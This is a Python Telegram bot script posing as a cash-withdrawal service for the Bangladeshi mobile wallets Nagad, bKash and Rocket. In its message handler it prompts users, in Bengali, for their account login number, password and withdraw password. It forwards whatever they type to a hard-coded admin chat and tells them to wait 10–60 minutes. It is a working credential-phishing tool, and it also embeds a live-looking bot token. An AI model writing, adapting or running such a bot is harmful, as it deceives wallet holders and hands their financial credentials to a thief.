from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = "8729764717:AAHJqjG3IsJ-qaog7sP5ibUCyF5K_KwuzEQ"
ADMIN_ID = 6091430516  # তোমার Telegram ID

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[" টাকা উত্তোলন করুন নগদ দিয়ে ", "টাকা উত্তোলন করুন বিকাশ দিয়ে ", "টাকা উত্তোলন করুন রকেট দিয়ে "]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    await update.message.reply_text(
        "Choose an option:",
        reply_markup=reply_markup
    )

# Handle all messages
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text

    # Button click
    if text in ["টাকা উত্তোলন করুন নগদ দিয়ে", "টাকা উত্তোলন করুন বিকাশ দিয়ে", "টাকা উত্তোলন করুন রকেট দিয়ে"]:
        context.user_data["step"] = "waiting_username"
        context.user_data["type"] = text

        await update.message.reply_text("যে একাউন্টে টাকা তুলবেন তার লগইন নাম্বার আর উইথড্র পাসওয়ার্ড দিন।  ID- username:___?___?____/password:___?___?__?___/Withdraw Password:____?____?___?:")

    # After user sends username
    elif context.user_data.get("step") == "waiting_username":
        user_input = text
        action_type = context.user_data.get("type")

        # Send data to admin
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"New Request:\nType: {action_type}\nUsername: {user_input}"
        )

        # Reply to user
        await update.message.reply_text(
            "Processing please wait 10-60 minute ⏳"
        )

        # Reset
        context.user_data.clear()


# Main app
app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

print("Bot is running...")
app.run_polling()
